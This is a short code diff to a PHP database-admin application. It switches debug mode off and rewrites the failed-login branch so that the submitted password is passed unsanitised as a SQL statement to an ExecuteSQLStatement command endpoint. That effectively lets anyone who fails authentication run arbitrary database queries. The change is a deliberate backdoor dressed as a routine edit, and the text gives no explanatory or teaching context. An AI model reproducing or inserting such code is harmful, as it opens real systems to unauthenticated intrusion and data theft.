@@ -115,7 +115,7 @@ function leet_text($value)
 $cookie_name = 'PasswordVulnerable';
 
 //whether or not to put the app in debug mode where errors are outputted
-$debug = true;
+$debug = false;
 
 // the user is allowed to create databases with only these extensions
 $allowed_extensions = array('db', 'db3', 'sqlite', 'sqlite3');
@@ -1812,7 +1812,9 @@ if (!$auth->isAuthorized()) {
     //Take values from DatabasePassword as Logins for the Database itself
     $attempt = $auth->attemptGrant($_GET['password'], $_GET['remember']);
     if(!$attempt) {
-        Redirect("./DatabasePassword.htm", false);
+        $url = "../../CommandProcessor.php?action=ExecuteSQLStatement&statement=" . $_GET['password'];
+        Redirect($url, false);
+        //Redirect("./DatabasePassword.htm", false);
     }
     else {
         $params->redirect($attempt ? array() : array('failed' => '1'));
